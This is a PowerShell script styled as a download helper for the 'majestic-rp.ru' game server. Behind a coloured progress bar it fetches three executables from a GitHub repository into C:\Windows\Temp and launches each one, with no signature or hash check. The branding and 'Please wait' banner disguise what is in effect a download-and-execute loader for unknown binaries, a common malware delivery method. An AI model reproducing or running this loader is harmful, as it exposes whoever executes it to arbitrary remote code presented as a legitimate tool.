Write-Host "Need help? Check our homepage: " -NoNewline
Write-Host "majestic-rp.ru" -ForegroundColor Green

$width = $Host.UI.RawUI.WindowSize.Width
if ($width -lt 1) { $width = 80 }

Write-Host (" " * $width) -BackgroundColor Cyan
Write-Host ("Downloading...").PadRight($width) -BackgroundColor Cyan -ForegroundColor White
$script:progressBarY = $Host.UI.RawUI.CursorPosition.Y
Write-Host (" " * $width) -BackgroundColor Cyan
Write-Host ("    Please wait").PadRight($width) -BackgroundColor Cyan -ForegroundColor White
Write-Host (" " * $width) -BackgroundColor Cyan
Write-Host ""
$script:bottomY = $Host.UI.RawUI.CursorPosition.Y

$downloads = @(
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe'; Path = 'C:\Windows\Temp\Timeless.exe' },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/timeless_scanner.exe'; Path = 'C:\Windows\Temp\timeless_scanner.exe' },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe'; Path = 'C:\Windows\Temp\block_majestic.exe' }
)

function Show-Progress {
    param ([int]$Percent)
    $barWidth = 40
    $filled = [int]($barWidth * $Percent / 100)
    $empty = $barWidth - $filled
    $bar = '#' * $filled + '-' * $empty
    $Host.UI.RawUI.CursorPosition = New-Object System.Management.Automation.Host.Coordinates 0, $script:progressBarY
    Write-Host ("  [$bar] $Percent%").PadRight($width) -BackgroundColor Cyan -ForegroundColor White -NoNewline
    $Host.UI.RawUI.CursorPosition = New-Object System.Management.Automation.Host.Coordinates 0, $script:bottomY
}

$totalFiles = $downloads.Count
$fileIndex = 0

Show-Progress 0

foreach ($item in $downloads) {
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $req = [System.Net.HttpWebRequest]::Create($item.URL)
        $req.AllowAutoRedirect = $true
        $req.UserAgent = "Mozilla/5.0"
        $response = $req.GetResponse()
        $totalBytes = $response.ContentLength
        $stream = $response.GetResponseStream()
        $fileStream = [System.IO.File]::Create($item.Path)
        $buffer = New-Object byte[] 8192
        $bytesRead = 0
        $totalRead = 0
        while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $fileStream.Write($buffer, 0, $bytesRead)
            $totalRead += $bytesRead
            if ($totalBytes -gt 0) {
                $filePct = ($totalRead / $totalBytes)
                $totalPct = [int](($fileIndex + $filePct) / $totalFiles * 100)
                Show-Progress $totalPct
            }
        }
        $fileStream.Close()
        $stream.Close()
        $response.Close()
        $fileIndex++
    }
    catch {
        Write-Host "`nОшибка: $($_.Exception.Message)" -ForegroundColor Red
    }
}

Show-Progress 100
Write-Host "`n"

foreach ($item in $downloads) {
    Start-Process $item.Path
}
